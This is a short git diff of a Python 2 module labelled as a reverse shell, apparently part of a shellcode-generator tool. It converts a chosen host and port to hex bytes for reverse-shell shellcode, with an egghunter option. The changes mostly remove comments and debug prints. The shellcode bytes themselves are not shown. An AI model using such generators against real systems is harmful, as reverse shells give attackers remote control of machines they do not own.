@@ -4,17 +4,13 @@ import socket
 from trexshellz import args_host,args_port,args_egg
 
 # reverse shell module
-# ready to add optimized shellcode to code[], below
-
 port = '\\x' + '\\x'.join(x.encode('hex') for x in struct.pack('>H',args_port))
 print "port after struct pack: " + port
 packedIP = socket.inet_aton(args_host)    # returns hex but need to reverse byte order
 i = packedIP.encode("hex")
-#print "host encode hex: " + i
+
 j = int(i,16)
-#print "host conversion to int: " + str(j)
 IP = '\\x' + '\\x'.join(x.encode('hex') for x in struct.pack('>L',j))
-#print('IP after struct pack: {!r}.'.format(IP))
 print "IP after struct pack: " + IP
 
 if args_egg is not False:
@@ -38,11 +34,7 @@ else:
     ]
 
 
-
-# better way to print list as one string?
 sc = ''.join(code)
+print "shellcode: " + sc
 
-print "payload: " + sc
-
-#print('shellcode: {!r}.'.format(str1))
 
